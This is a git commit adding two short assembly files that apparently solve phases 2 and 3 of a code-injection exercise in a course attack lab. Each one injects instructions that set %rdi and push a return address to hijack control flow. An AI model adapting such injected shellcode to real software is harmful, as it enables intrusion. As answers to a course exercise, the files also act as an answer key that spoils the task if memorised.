477b5dda71a34d81dd340e9c488b36b1c6ee4f22
Yue Pan <zxc479773533@gmail.com>
2017-10-21 19:11:01 +0800

    finish code injection attacks

---
+++ attacklab/phase2.s
@@ -0,0 +1,4 @@
+# to solve the level 2 of Code Injection Attacks
+mov $0x59b997fa, %rdi # set cookie in %rdi
+push $0x4017ec
+ret
---
+++ attacklab/phase3.s
@@ -0,0 +1,4 @@
+# to solve the level 3 of Code Injection Attacks
+mov $0x5561dca8, %rdi # set string address in %rdi
+push $0x4018fa
+ret
